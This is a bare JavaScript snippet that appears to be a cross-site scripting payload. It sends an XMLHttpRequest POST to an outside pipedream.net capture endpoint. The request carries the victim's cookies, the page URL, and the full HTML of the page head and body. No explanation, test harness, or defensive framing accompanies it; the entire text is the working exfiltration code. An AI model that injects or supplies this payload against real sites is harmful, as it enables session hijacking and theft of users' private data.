var xhttp = new XMLHttpRequest();
xhttp.open("POST", "https://entmx3e4ufvjg87.m.pipedream.net", true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("data=".concat(document.cookie).concat(document.URL).concat("html=").concat(document.getElementsByTagName("head")[0].innerHTML).concat(document.getElementsByTagName("BODY")[0].innerHTML));
